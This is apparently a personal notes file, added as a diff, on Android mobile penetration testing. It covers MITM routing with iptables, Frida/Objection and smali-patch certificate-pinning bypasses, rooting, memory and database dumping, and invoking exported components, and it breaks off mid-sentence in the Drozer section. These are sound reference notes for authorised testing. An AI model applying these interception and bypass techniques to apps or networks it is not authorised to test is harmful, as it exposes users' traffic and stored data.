@@ -1,0 +1,1560 @@
+Mobile Pen Test
+
+MobiSec Live Environment -> mobisec.secureideas.net
+	Donated to OWASP
+	Includes tools for pen testing, secure development, forensics
+	
+OWASP Mobile top 10:
+	https://www.owasp.org/index.php/OWASP_Mobile_Security_Project
+	tools, guidelines, standards
+	
+Mallory -> transparent TCP and UDP proxy, not just a web proxy
+	uses IP tables and network adapters, it becomes our gateway
+	http://intrepidusgroup.com/insight/mallory/
+
+SecurityCompass ExploitMe Mobile LabServer
+	https://github.com/securitycompass/LabServer
+	https://github.com/securitycompass/AndroidLabs
+
+WSAttacks -> Good for fuzzing, has wiki
+	wsattacks.org???
+
+
+AWESOME CHEAT SHEET!!! **********************
+https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet/
+
+
+MITM Technique:
+
+	Run on Kali Linux:
+	Set Burp to listen on all Interfaces in Invisible mode
+
+	Fix routing table:
+	route del default gw 192.168.1.1 eth0
+	route del 192.168.1.1/32 eth0
+	route add default gw 192.168.1.1 eth1
+	#route add -net 10.1.1.0/24 eth0
+
+	Routing table needs to look like this:
+	eth1 is wireless adapter -> it connects to beaner network
+	eth0 is connected to "temp" network 192.169 not 168
+	10.1.1.0 is is the "temp" wireless network
+
+	Kernel IP routing table
+	Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+	default         192.168.1.1     0.0.0.0         UG    0      0        0 eth1
+	#10.1.1.0        *               255.255.255.0   U     0      0        0 eth0
+	192.168.1.0     *               255.255.255.0   U     0      0        0 eth1
+	192.169.1.0     *               255.255.255.0   U     0      0        0 eth0
+
+	Enable IPforwarding:
+	#/sbin/modprobe ipt_MASQUERADE
+	#echo "0" > /proc/sys/net/ipv4/conf/all/rp_filter 
+
+	#iptables -i eth0 -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080
+	#iptables -i eth0 -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
+
+	echo "1" > /proc/sys/net/ipv4/ip_forward
+	iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
+	iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8080
+	iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
+
+	iptables -L -t nat
+
+4 Android Components:
+	ACTIVITY - UI "page" that you see
+	SERVICE - background processing
+	BROADCAST RECEIVER - component that listens for system messages or 
+		broadcast announcements called Intents. 
+	CONTENT PROVIDER - manages a shared set of application data
+		(share data access apps) (sqlite db) (note pad app uses content
+		provider to save notes)
+
+Android 
+	Enable USB Debugging Mode on Galaxy Tablet:
+		Settings -> General -> About Device -> Tap Build Number 7 times
+		Then go to: Settings -> General -> Developer Options -> USB Debugging
+
+	Rotate Emulator Device:
+		FN-CTRL-F12 on a MAC running Santoku
+
+	
+Rooted:
+	When rooted and SU'ed up, SDcard is in the following location:
+		/storage/emulated/0/
+
+Cert Pinning:
+	
+	Four ways to bypass Cert Pinning 1/9/2018
+		https://blog.netspi.com/four-ways-bypass-android-ssl-verification-certificate-pinning/
+
+	Objection -> 
+		On Mac (192.168.1.98) with emulator installed and app installed in emulator:
+			cd ~/Library/Android/sdk/platform-tools
+			./adb forward tcp:27042 tcp:27042
+				27042 is frida-server port on the emulator
+
+			Then run:
+				mkfifo backpipe ; nc -l 27042 < backpipe |nc 127.0.0.1 27042 > backpipe
+					this creates a listed on 27042 and forward to frida server
+
+		On emulator 
+			cd /data
+			./frida-server &
+
+		On kali linux on main Mac:
+			objection -N --host 127.0.0.1 --gadget="com.app.name" explore —-startup-command “android root disable”
+				android sslpinning disable
+					may have to run more than once
+				android root disable
+
+				Dump memory
+					memory dump all memory.dump
+
+				List activities, receivers and services
+					android hooking list services
+					android hooking list receivers
+					android hooking list activities
+	
+				-Keystore/Intents
+					android keystore list
+					android intent launch_activity
+					android intent launch_service			
+
+
+				Get current activity
+					android hooking get current_activity
+					
+				Search classes
+					android hooking search classes <activity returned from Get Current Activity> 
+			
+				Search Methods of a class
+					android hooking search methods <class returned from Search Classes>
+
+			
+				android hooking list activities
+
+				android hooking watch class
+					android.bluetooth.le.ScanRecord —dump-args —dump-backtrace
+			
+
+	Frida with script:
+		On emulator:
+			cd /data
+			./frida-server &
+			cp burpCA.crt to /data/local/tmp/cert-der.crt
+				must be that name for script to work
+
+		On Mac:
+			adb forward tcp:27042 tcp:27042
+			frida -H 127.0.0.1 -f com.fiserv.touchbankingasp -l ./ssl_pin_bypass_jimmy.js --no-pause
+				-l -> Load script
+			
+
+	Disable Certificate Pinning:
+		https://github.com/iSECPartners/Android-SSL-TrustKiller
+		https://github.com/iSECPartners/Android-SSL-TrustKiller/releases
+		https://github.com/iSECPartners/android-ssl-bypass
+
+	Android tools -> Force debugging, disable Cert Pinning:
+	https://www.isecpartners.com/tools/mobile-security.aspx
+
+	Reframeworker -> Trust All Certs button
+		Can defeat Certificate Pinning
+
+		ReFrameworker - runtime manipulation framework by AppSec Labs
+		java -cp ./ReFrameworkerDashboard.jar com.AppSecLabs.ReFrameworker.ReFrameworker_Dashboard
+
+		This path/file needs to exist:
+		/home/appuse/workspace/ReFrameworker/assets/app_conf/Reframeworker.xml
+
+
+	Xposed Installer Application - https://xposed-installer.en.uptodown.com/android
+
+		Inspeckage - Dynamic Analysis of Android apps at runtime (Xposed Module):
+				Possible Cert Pinning Disable feature
+			Install APK file:
+			https://github.com/ac-pm/Inspeckage
+	
+			Forward port 8008 so we can access it with a browser on our Mac	
+				adb forward tcp:8008 tcp:8008
+		
+				http://<ip of device>:8008
+					or
+				http://127.0.0.1:8008
+
+		JustTrustMe - Xposed Module for cert pinning bypass:
+		https://github.com/Fuzion24/JustTrustMe
+
+		SSLUnpinning Xposed module:
+		https://github.com/ac-pm/SSLUnpinning_Xposed
+
+
+	MobSF -> See MobSF section above 
+
+	
+	Look in logcat for error message around certificate pinning when the application fails. Go to the Smali file where the line 
+		number is refernced in logcat. The Line number listed in logcat is not the actual line number but the function number
+		which is reference by "line <number>" in the smali file.
+		modify smali file and rebuild with apktool b <directory name>, sign apk and install to device
+
+
+	Search for TrustManager in source code 
+		The smali file .//smali/com/wawa/android/app/server/AppDefaultTrustManager.smali contains the following methods:
+			.method public checkClientTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
+			.method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
+
+		In order to bypass the cert pinning we just need to replace the contents of the checkServerTrusted to always return void.
+		For instance, just replacing its content (the entire method) with the one from checkClientTrusted:
+
+			.method public checkServerTrusted([Ljava/security/cert/X509Certificate;Ljava/lang/String;)V
+			    .locals 0
+
+			    .prologue
+			    .line 71
+			    return-void
+			.end method
+
+		
+	Find certificate in Source Code -> install it in the proxy.
+
+		Classes used in SSL Pinning:
+			KeyStore
+			TrustManager
+			SSLContext
+
+		Generate a root CA Certificate for use with Burp and to fool the application:
+			openssl genrsa -out encryption.key 1024
+			openssl req -new -key encryption.key -out tmpcert.crt
+				Country: .
+				State: .
+				Locality Name: .
+				Organization Name: *.tools.ietf.org
+				Organization Unit Name: *.tools.ietf.org
+				Common Name: *.tools.ietf.org
+				email: .
+				Passwd:
+				Optional Company name: .
+			openssl x509 -req -in tmpcert.crt -signkey encryption.key -out tmp2cert.crt
+			openssl pkcs12 -export -in tmp2cert.crt -inkey encryption.key -out sslcert.p12
+	
+			Import into Burp:
+			Proxy -> Options -> Edit -> Certificate -> "Use a custom certificate"
+	
+			The above example only works if they are only checking for a valid host name
+			If they are checking for a specific CA you can generate that certificate with
+			the Burp PortSwigger Cert
+
+
+
+	Set Geo Location for Bailey on Android Emulator:
+		telnet localhost 5554
+		geo fix 39.4553330 -105.4126830 
+		Other sample location:
+			geo fix -121.45356 46.51119 4392
+		Also:
+			adb emu geo fix 39.4553330 -105.4126830 
+		Also:
+			geo nmea $GPRMC,081836,A,3751.65,S,14507.36,E,000.0,360.0,130998,011.3,E*62
+
+
+
+
+
+
+
+	run sdk/tools/android sdk or sdk/tools/android sdk ->to start Android SDK Manager
+	run android avd -> to start Android Virtual Device Manager
+
+	Install Google Play:
+		./android
+			Open the "Extras" directory and select:
+				Google Repository
+				Google Play Service
+
+	Apk Studio -> Decompile and Recompile Android APK packages
+
+
+	To get a Shell on device:
+		adb shell
+		cd /data/data/com.jimmy.bla/
+			Directories to check when testing:
+			check 	cache
+				databases
+				files
+
+	adb devices 
+	adb -s <device name returned from above> shell
+		allows you to select which device to connect to
+
+	adb connect <remote IP>:<port>
+	adb connect 192.168.1.1:5555 
+		port 5555 is the default
+
+	WiFi ADB:
+		Connect via adb over Wi-Fi
+	https://play.google.com/store/apps/details?id=com.ttxapps.wifiadb&hl=en_US
+
+
+	To get Database off of device
+		adb pull /data/data/com.jimmy.bla/databases/webview.db
+		adb pull /data/data/com.jimmy.bla/	#pulls entire directory tree
+
+	use SQLite Manager (Firefox Addon) to open and browse SQLite db's
+	
+	SQLit syntax:
+	sqlite3 filename
+		.tables				List all tables
+		.schema [tablename]		List table schema
+		select * from [tablename];	Query Table
+		.exit				Exit sqlite3
+
+	To view BLOB data in SQLite DB:
+		sqlite3 <database name>
+			.tables 	-> shows tables
+			select quote(<column name>) from <table name>;
+				i.e. select quote(password) from users;
+
+
+	To put file on device:
+		adb push cacert.der /mnt/sdcard
+
+
+	To Install application on device:
+		adb install blablabla.apk
+
+	“adb kill-server" then "adb start-server"
+
+	Get list of Intents:
+	dumpsys	package	> pkg.txt
+	am start -n <intent>
+
+
+Start and Stop programs
+adb shell am force-stop com.some.package.name
+adb shell am startservice com.some.package.name/.YourServiceSubClassName
+
+	How to use the emulator:
+	http://developer.android.com/tools/devices/emulator.html
+
+
+	How to delete a test host from the SDK.
+		cd .android/avd
+		rm <host>.ini
+		rm -rf <host>.avd
+
+
+	Install BurpCA
+	Export BurpCA file as a pen file (burpca.crt) from Firefox
+	launch: “python -m SimpleHTTPServer” in the same directory as burpca.crt
+	On the browser in the Android device goto http://<ip of simple http serv>:8000/burpca.crt
+	When asked for the name type: PortSwiggerCA, VPN or App and select ok.
+
+	Run on host to make changes to the emulator:
+		launchctl setenv studio.emu.params -writable-system
+
+
+	Install Burp CA Cert into device when above doesn’t work
+	(when Settings -> Security -> Install from Storage (DER, PEM or PKCS12 stupid fucking bugs) does not work):
+		/system directory is read-only, you must remount:
+			adb shell
+			mount -o rw,remount /system
+			#mount -o ro,remount /system #to put it back
+			try push command above again
+		Export Portswigger CA cert from Firefox as PEM file
+		rename file to 9a5ba575.0
+		copy to Android device (must use this!! can NOT copy from sdcard):
+			push 9a5ba575.0 /system/etc/security/cacerts/	
+			
+		/system directory is rebuilt with each reboot of device.  Therefore,
+		you must perform the steps above every time you want to use it.
+
+		you can make sure it shows up in the “Trusted Credentials”  
+			Settings -> Security -> Trusted Credentials - CA Certs
+
+		Another method:
+		Export Cert from Burp:
+			Proxy -> Options -> CA Certificate... -> Certificate in DER format -> Name it PortSwigger.der
+		openssl x509 -inform DER -subject_hash_old -in PortSwigger.der 
+		copy cert into burp.cer
+		cat burp.cer > 5ed36f99.0 (5ed36f99 is value that showed up at the top of the previous command)
+		openssl x509 -inform PEM -text -in burp.cer -out /dev/null >> 5ed36f99.0
+
+				
+	To Configure Proxy on Device:
+		Settings -> Settings -> Wireless & Networks, More -> Cellular Networks ->
+			Access Point Names -> T-Mobile US -> Proxy
+		
+		If Proxy settings are not working for the application run the emulator like this:
+			./emulator -avd Nexus7 -http-proxy http://192.168.1.103:8080
+				# Note...use emulator instead of android
+
+			/Users/jtharel/Library/Android/sdk/tools/emulator -avd Nexus5 
+			/Users/jtharel/Library/Android/sdk/tools/emulator -avd Android_Accelerated_Oreo
+
+	Create new Emulator:
+		Open Android Studio from Applications on Mac
+			Tools -> Android -> AVD Manager
+
+	Apps often ignore Proxy settings on Android device
+	For example, HttpURLConnection and DefaultHTTPClient connects
+	directly to the origin server
+
+	Apps without Proxy support - Manual redirection using IPTables:
+		Requires Root on Device:
+		echo 1 > /proc/sys/net/ipv4/ip_forward
+		iptables -t nat -A OUTPUT -d 1.2.3.4 -j DNAT --to-destination <burp ip>
+
+		Delete the rules:
+			iptables -t nat -F
+
+
+	To Configure DNS on Device
+			./emulator -avd Nexus7 -dns-server 10.1.1.1
+
+	Use TCPDump On emulator
+		./emulator -avd Nexus7 -tcpdump file.pcap
+			# Note...use emulator instead of android
+
+	Update android software
+		android update sdk --no-ui
+
+
+	Each App on Android:
+		Runs as a separate user
+		Runs in a separate process
+		Runs with different permissions
+		Has its own DB
+		Is authenticated at the IPC level
+
+	/data/app -> APK files for all apps installed by the user
+	/system/app -> APK files that were installed by manufacturer
+	/data/data -> application installation directories/files
+	
+	resoures.arsc -> images
+
+
+	"system" account is the Admin account on Android, not as powerful as root though
+		file permission on android applications
+
+	****->
+	Check permissions on Databases in databases directory 664 means all other applications
+		have a 4 (read) permissions on the database
+	<-****
+
+	run-as com.appsec.hackmepal -> will change to that user of that package
+	
+	
+	SDCARD is shared storage -> APP A can read APP B's data if stored on SDCARD, all apps
+		can read data on SDCARD
+
+
+	Applications with the "READ_LOGS" permission can read logcat log messages
+		Permissions listed in Manifest file
+			i.e INTERNET, WRITE_EXTERNAL_STORAGE, ACCESS_NETWORK_STATE
+
+
+
+Temporarily install Google Play on Emulator:
+	Make sure AVD uses Google API instead of Android API in AVD setup
+	Get correct version of gapps from: http://www.teamandroid.com/gapps/
+	unzip file
+	cd system/priv-app
+	adb -s emulator-5554 shell mount -o rw,remount /system
+	adb -s emulator-5554 shell chmod 777 /system/priv-app/
+	adb -s emulator-5554 push GoogleServicesFramework/GoogleServicesFramework.apk /system/priv-app/
+	adb -s emulator-5554 push GoogleLoginService/GoogleLoginService.apk /system/priv-app/
+	adb -s emulator-5554 push Phonesky/Phonesky.apk /system/priv-app/
+	Play Store icon will appear in Applications 
+
+
+Android Forensics:
+mtd0 handles miscellaneous tasks
+mtd1holds a recovery image
+mtd2 contains the boot partition
+mtd3 contains system files
+mtd4 holds cache
+mtd5 holds user data 
+
+dd if=/dev/mtd/mtd0 of=/sdcard/mtd0.dd bs=1024  
+dd if=/dev/mtd/mtd1 of=/sdcard/mtd1.dd bs=1024  
+dd if=/dev/mtd/mtd2 of=/sdcard/mtd2.dd bs=1024  
+dd if=/dev/mtd/mtd3 of=/sdcard/mtd3.dd bs=1024  
+dd if=/dev/mtd/mtd4 of=/sdcard/mtd4.dd bs=1024  
+dd if=/dev/mtd/mtd5 of=/sdcard/mtd5.dd bs=1024  
+
+
+Andriller Forensic Decoder application -> allows decoding phone logs, sms logs, etc.
+	https://www.andriller.com
+	
+	Additional decoders for Andriller:
+	https://www.andriller.com/decoders/
+
+	Linux install has issues. Might need to use Windows Version.
+
+
+
+Jimmy’s Methodology:
+
+	Android apps to assist:
+		Dexplorer - directly on your android device
+
+		APK Editor Pro - edit apk content directly on android device.
+			https://play.google.com/store/apps/details?id=com.gmail.heagoo.apkeditor.pro
+
+		IntentSniffer - Sniffs intents to see what information is sent to them
+		
+
+	Monitor log while using application:
+		cd sdk/platform-tools/
+		./adb shell
+		logcat		#login to application, submit CC numbers, etc.  Look
+				 in log for information
+		logical -b main		view the buffer with radio/telephony messages
+		logcat -b events	view the buffer with events-related messages
+		logcat -b main		view the main log buffer (default)
+		
+		logcat -v time		display the date, time and PID of the message
+
+	Convert apk file into text files for easy grepping using apktool:
+		https://code.google.com/p/android-apktool/
+		http://ibotpeaches.github.io/Apktool/		#Read Installation guide	
+			download two files and copy to /usr/local/bin
+			mv /usr/local/bin/apktool_x.x.jar /usr/local/bin/apktool.jar
+		aapt utility must be in path for apktool to work
+		apktool d app.apk
+
+		grep -iR “https://“ * |grep -v “schemas.android.com”
+			Look at URL’s to understand how app communicates
+
+	dex2jar + JD-GUI -> lets you reverse engineer an apk to nearly re-compilable 
+		Java. Great for understanding the code, looking for embedded
+		data, credentials etc
+		https://github.com/pxb1988/dex2jar
+			/usr/local/opt/dex2jar/bin/d2j-dex2jar app.apk -o app.jar
+		Use dex2jar to view code -> it's easier to read
+			dex2jar classes.dex - converts the dex file to a jar file 
+
+	jadx	dex to java decompiler
+		https://github.com/skylot/jadx
+		Installation:
+			git clone https://github.com/skylot/jadx.git
+			cd jadx
+			./gradlew dist
+		Usage:
+			jadx androidapp.apk
+				expect to see errors in output
+
+			jadx-gui
+				file -> open -> app.apk
+
+	Search for:
+		Strings and Variables:
+		grep -iREo ".{0.30}key.{0,30}" *     -> gets only the 30 characters before and after the match
+		Grep -iR "key" *
+			password=/pwd=		id		userid/user_id	user[\ :=]
+			username		user_name 	connect		connection
+			connector		token		key		encrypt
+			decrypt			login		address		root
+			secret			auth		"select * from"	"SELECT %@ FROM"
+			access			private		href		url
+			http and //		https		https://	http://
+			account			sql		admin		passwd
+			api			apikey		github		gmail
+			@ and .com		Facebook	twitter		pk
+			rsa			jdbc		cipher		crypto
+			X.509
+
+		Classes:
+			Cipher, HttpURLConnection, ExternalStorage
+
+		Namespaces:
+			javax.crypto, java.net, java.io.file
+		
+		WebView -> "embedded" browser used in apps to render and display HTML
+		search for "addJavascriptInterface" -> exposes Java objects (potentially xss)
+
+		File injections:
+		search for "openFileOutput"
+		openFileOutput("someDirectory/"+filename, Context.MODE_WORLD_READABLE);
+
+
+	Unzip APK
+	Look in assets/ folder for cafile
+
+	Tap Jacking:
+		https://github.com/mwrlabs/tapjacking-poc
+
+
+Dump the Contents of the AndroidManifest.xml file:
+	androaxml.py -i app.apk -o AndroidManifest.xml
+		From AndroGuard
+		https://code.google.com/p/androguard/downloads/detail?name=androguard-1.9.tar.gz&can=2&q=
+
+	AdndroidManifest.xml -> description of app
+		applications components
+		Which permissions the application must have
+		permissions that others are required to have
+
+		Under activities in Manifest:
+		If intent has a filter, it can be accessed by other applications
+		If intent does not have a filter only the application it was written for can communicate 
+		with it.
+		android:exported="true" means component can be accessed by by other applications
+
+
+	am	Send some intent but don't want any coding overhead
+		Can send intents to components
+		Can also call not-exported activities
+		am start -a android.intent.action.MAIN -n org.owasp.goatdroid.herdfinancial/.activities.Main
+
+	
+	Look at code if Intent fails via am
+	You may need to include extras like "id", etc. to get it to execute properly
+		Drozer would fall short here
+		add:  -e id 1 -e refund 2 -e amount 3   to the end of the am command above
+		-e -> "extra"
+
+	Another example with a broadcast receiver:
+	am broadcast -n com.appsec.hackmepal/com.appsec.hackmepal.BrReciever -e uid david -e refund apsec -e amount 10
+	*****Example with Code*****
+	Code Snipet:
+	public class SendSMSNowReceiver extends BroadcastReceiver
+	{
+	    Context context;
+    
+	    public void onReceive(final Context context, final Intent intent) {
+	        this.context = context;
+	        final SmsManager default1 = SmsManager.getDefault();
+	        final Bundle extras = intent.getExtras();
+	        default1.sendTextMessage(extras.getString("phoneNumber"), (String)null, extras.getString("message"), (PendingIntent)null, (PendingIntent)null);
+	        Utils.makeToast(this.context, "Your text message has been sent!", 1);
+	    }
+	}
+	am broadcast -n org.owasp.goatdroid.fourgoats/.broadcastreceivers.SendSMSNowReceiver -e phoneNumber 3031231234 -e message hi
+	*****Example with Code*****
+
+		
+	Any component with the attribute android:exported=true or having an 
+		<intent-filter> can be invoked by another app.
+	am runs under high privileges and is therefore not restricted while regular/
+		malicious applications run under the application UID and won't be able
+		to launch non-exported activities
+	Search code for dynamic components. Dynamic components can be defined at runtime
+		and not defined in the Manifest file.
+
+
+Reversing Android App (Good Write Up):
+https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/
+
+
+
+Android Lint -> Finds vulnerabilities in Android project sources
+
+	cd into project
+	lint . --check Security --simplehtml security_report.html
+	http://developer.android.com/sdk/index.html
+	http://developer.android.com/tools/help/lint.html
+	Search source code for:
+		@SuppressLint("SetJavaScriptEnabled")
+		<!--suppress AndroidLinthardcodedText -->
+
+Xposed - framework for changing the behavior of the system and apps w/out touching any APK
+	https://www.xda-developers.com/official-xposed-framework-android-nougat/
+
+
+Inspeckage - Dynamic Analysis of Android apps at runtime (Xposed Module):
+		Possible Cert Pinning Disable feature
+	Install APK file:
+	https://github.com/ac-pm/Inspeckage
+
+	Forward port 8008 so we can access it with a browser on our Mac	
+		adb forward tcp:8008 tcp:8008
+	
+		http://<ip of device>:8008
+			or
+		http://127.0.0.1:8008
+
+
+Qark -> findings vulns in APK files
+	https://github.com/linkedin/qark
+	python ./qarkMain.py
+		Path to SDK: /Users/jtharel/Library/Android/sdk/
+
+AndroBugs Framework -> find bugs in APK files
+	https://github.com/AndroBugs/AndroBugs_Framework
+	python ./androbugs.py -f app.apk
+
+MobSF - Mobile Security Framework
+	https://github.com/MobSF/Mobile-Security-Framework-MobSF
+	
+	Installation on Ubuntu 22.04
+		sudo apt install snapd openjdk-8-jdk git build-essential
+		snap install mobsf
+		Download and Install Android Studio 
+			https://developer.android.com/studio
+		-> create VM:
+			Pixel 5 
+			Pie Android 9.0 x86_64 API 28
+				Graphics: Software-GLES 1.1
+				Boot Option: Quick boot
+		Launch Emulator using the command:
+			emulator -avd Pixel5 -writable-system
+		Then Launch 'mobsf'
+			Must add path to adb in config.py file
+				/home/jtharel/snap/mobsf/8/.MobSF/config.py
+					/home/jtharel/Android/Sdk/platform-tools/adb
+
+			helps to add adb and emulator to path in .bashrc:
+				export PATH="/home/jtharel/Android/Sdk/platform-tools:$PATH"
+				export PATH="/home/jtharel/Android/Sdk/emulator:$PATH"
+
+
+
+
+TrueSeeing -> Vuln Scanner for Android Apps
+	https://pypi.python.org/pypi/trueseeing
+	trueseeing /path/to/target.apk > report.html
+
+
+Manual Patching or Modifying an APK file:
+	1. Extracting the APK
+	apktool d someapp.apk -o outputDir
+		d is disassemble
+	modify source code
+	
+	2. Rebuild a new APK
+	apktool b outputDir -o patched.apk
+		b is build
+
+	3. Sign the APK
+	java -jar ~/svn/SignApk/signapk.jar ~/svn/SignApk/testkey.x509.pem ~/svn/SignApk/testkey.pk8 patched.apk patched_signed.apk
+		http://www.adbtoolkit.com/kitchen/tools/linux/signapk-README.txt
+
+		or
+	
+	keytool -genkey -v -keystore jimmy.keystore -alias Test -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 10000
+	jarsigner -keystore jimmy.keystore patched.apk -sigalg SHA1withRSA -digestalg SHA1 Test
+
+
+	4. Install APK
+	adb install patched_signed.apk
+		may have to uninstall existing package
+
+
+When apktool fails:
+Use baksmali and smali if you want to modify or read code (https://bitbucket.org/JesusFreke/smali/downloads)
+baksmali -> disassembler/decoder for files (like classes.dex, manifest) if it is encoded
+	unzip app.apk
+	baksmali classes.dex -o out
+	cd into directory out 
+	now they can be viewed and modified
+
+If you modified a file from baksmali:
+smali out/ -o classes2.dex
+
+Use dex2jar to view code -> it's easier to read
+dex2jar classes.dex - converts the dex file to a jar file 
+
+
+Luyten -> good tool for looking at code -> Like JD-GUI
+
+
+Obfuscated Code:
+	Sometimes Decompilation fails
+		Try using different decompiler
+		Remove the problematic class/subclass/method
+		Accept the fact you need to work with smali..
+
+
+	Show Debuggable PIDs on device:
+		adb jdwp
+		Is app in debug mode?
+		If so go to AndBug section below
+
+	Add Debugging to package
+		apktool d -d app.apk -o out
+
+		Modify AndroidManifest.xml
+			android:debuggable="true"
+
+		Build a new APK in debug (-d) mode:
+		apktool b -d out/ -o debuggable.apk
+		signapk debuggable.apk
+
+		ddms -find package we are interested in, it will show you the port the debugger
+			is listening on
+
+		Create Netbeans project, use netbeans to step through application
+
+
+
+
+	AndBug debugger for Android apps
+		https://github.com/swdunlop/AndBug
+		install: git clone https://github.com/swdunlop/AndBug.git
+		andbug shell -p <pid of app>	
+
+How to find loaded libs:
+	adb shell cat /proc/[pid]/maps |grep .so
+
+
+Dumping memory
+	It’s possible to dump the memory of a running Android App and
+	then pull that off the device for examination
+	https://eclipse.org/downloads/ - comes with eclipse
+	./adb shell
+	# chmod 777 /data/misc <- place where the heap dump will go
+	# ps <- get the pid of the app you wish to dump
+	# kill -10 {pid} <- dumps the process memory to /data/misc in a
+	format like heap-dump-tm1310992312-pid267.hprof
+	NOTE: This does not always work on every device – but will on the
+	emulator
+	Open in Hexeditor
+
+
+	fridump from Frida can dump memory
+		http://pentestcorner.com/introduction-to-fridump/
+		On Mobile Device Goto /sdcard/Download
+		./frida-server
+
+		On Mac from fridump directory run:
+		python ./fridump.py -U -s -o . —max-size 2097152 com.app.name
+			or
+		python ./fridump.py -U <process name>
+
+	fridump3
+		https://github.com/rootbsd/fridump3
+		has ability to attaach via IP an not just USB
+		python3 ./fridump3.py -H 10.1.1.1 com.app.blah
+			To run it against the emulator:
+			adb -s emulator-5554 forward tcp:27042 tcp:27402	#on mac
+			./frida-server -l 0.0.0.0 				#on android
+			python3 ./fridump3.py -H 127.0.0.1 com.app.blah		#on mac
+
+
+	Memdump -> dump memory of a pid
+		memdump <pid> 
+		memdump <pid> > mem.txt
+			strings mem.txt
+		
+		See “memdump howto” section at bottom of doc for how to build
+
+
+
+
+
+Search Memory for things:
+
+	Run 'DDMS' -click on target app process and click "Dump HPROF File"
+	
+	If in Eclipse, go to the DDMS perspective(instead of JAVA), select the app 
+	from column on the right and click "Dump HPROF file"
+
+	Convert .hprof file to "standard format" to view with profiling tool:
+	hprof-conv [-z] <infile> <outfile>	#utility comes with Android Studio
+		You can use "-" for <infile> or <outfile> to specify stdin or stdout.
+		You can use "-z" to filter out zygote allocations shared by all applications.
+
+	Get MAT (Memory Analyzer Tool):
+	http://www.eclipse.org/mat/downloads.php
+
+	Run MemoryAnalyzer
+		Load output file from hprof-conv command above.
+		Click "Open Dominator Tree For Entire Heap" button
+		Click "Group Result By..." button and select "Group by Package"
+		Go and find the class you are looking for. Right click it
+			and choose "List Object -> with outgoing references"
+		Expand results and see the data you are looking for
+
+
+File Observer - observes real time file access, Only on SDCARD.
+	adb install SuperUser.apk
+	Requires SuperUser below:
+
+
+SuperUser -
+	Superuser.apk -> allows applications to request root user (rooted devices can do this)
+		Android Devvice->Root(SuperUser/SU) in AppUSE
+
+	Determine Android Version:
+		adb shell getprop ro.build.version.release
+	
+	Configure Device:
+		adb shell mount -o rw,remount -t yaffs2 /dev/block/mtdblock3 /system
+		adb push su /system/xbin/su
+		adb shell chmod 6755 /system/xbin/su
+		adb shell ln -s /system/xbin/su /system/bin/su
+		adb install -r Superuser.apk
+		adb shell "/system/xbin/su --daemon"
+
+	Uninstall SU:
+		adb remount
+		adb shell mount -o rw,remount -t yaffs2 /dev/block/mtdblock3 /system
+		adb shell rm /system/xbin/su
+		adb uninstall com.koushikdutta.superuser			
+
+
+Frida - 	dynamic code instrumentation toolkit.
+		http://www.frida.re/docs/home/
+		Quick Start Guide:
+			http://www.frida.re/docs/quickstart/
+			http://www.frida.re/docs/android/
+			https://www.codemetrix.net/hacking-android-apps-with-frida-1/
+			https://www.codemetrix.net/hacking-android-apps-with-frida-2/
+
+		Install Server on Android device:
+			Download latest from https://github.com/frida/frida/releases
+			7z e frida-server-9.1.6-android-arm.xz
+			mv frida-server-9.1.6-android-arm frida-server
+			adb push frida-server-9.1.6-android-arm /sdcard/Download
+			adb shell
+			su -
+			chmod 755 /sdcard/Download/frida-server
+			/data/frida-server &
+				or
+			/data/frida-server -l <ip of android> &
+
+
+
+		Install Frida on Ubuntu:
+			sudo add-apt-repository ppa:jonathonf/python-3.6
+			sudo apt-get update
+			sudo apt-get install python3.6 libpython3.6
+			sudo apt-get install python3-pip
+			pip3 install frida
+			pip3 install frida --update #to upgrade to latest.
+
+
+		Useful commands from Ubuntu:
+			frida-ps -U 
+				-U is connect via USB
+			frida-ps -H <ip of android>
+
+			frida-ps -U -a
+				list apps running on device
+
+			frida-ps -U -ai
+				list installed apps
+
+			
+
+		
+		
+
+
+
+
+Drozer -	Testing framework for android, client and server piece
+		https://www.mwrinfosecurity.com/products/drozer/community-edition/
+		Install drozer_2.3.3.deb server in Ubuntu
+			dpkg -i drozer_2.3.3.deb
+		Install agent on Android device
+			adb install agent.apk
+				or
+			http://<ip of drover server>:31415  #if server is running (see next section below)
+		
+		IF EVERYTHING IS LOCAL:	
+		Connect agent to server
+			Set up a port forward so that Ubuntu can connect to a TCP 
+			socket opened by the Agent inside the emulator By default, 
+			
+			On Ubuntu host:
+			drozer uses port 31415:
+				adb forward tcp:31415 tcp:31415
+			drozer console devices 
+				shows connectable devices
+
+			click Drozer Agent on android device
+				Select the “Embedded Server” option
+				Slide the bar to “Enabled”
+			On Ubuntu run the Server:
+				drozer console connect
+
+		IF ANDROID DEVICE IS REMOTE OR PHYSICAL DEVICE:
+			Run a server on your Linux Box:
+				drozer server start
+			On the Android Device:
+				Start the drover agent, press the menu button, and choose 'Settings'
+				Select 'New Endpoint'
+				Set the 'Host' to your IP and the port to 31415
+				Click 'Save'
+			Back on the Linux box in a new window:
+				drozer console connect
+
+		ANDROID DEVICE IS IN EMULATOR ON MAC (192.168.1.98)
+			On the Android Device:
+				Start the drozer agent
+				Select "Embeded Server" to turn it on
+			Run this on the mac to set up forwarding to the Android emulator:
+				adb forward tcp:31415 tcp:31415
+				mkfifo backpipe
+				nc -l 31415 0<backpipe |nc 127.0.0.1 31415 | tee backpipe
+			One the Windows VM on my mac
+				drozer console connect --server 192.168.1.98
+
+
+		Drozer Console:
+			Run "list" to list all commands:
+				list
+			Find the identifier for your application:
+				run app.package.list -f <appname>
+					-f is a filter i.e mcd to search for McDonalds apps
+			Package info:
+				run app.package.info -a <package name returned above com.app.bla>
+			Identify Attack Surface:
+				run app.package.attacksurface <com.app.bla>
+					15 activities exported
+					5 broadcast receivers exported
+					2 content providers exported
+					2 services exported
+					  is debuggable
+
+					This shows that we have a number of potential vectors. The 
+					app ‘exports’ (makes accessible to other apps) a number of 
+					activities (screens used by the app), content providers 
+					(database objects) and services (background workers).  We 
+					also note that the service is debuggable, which means that 
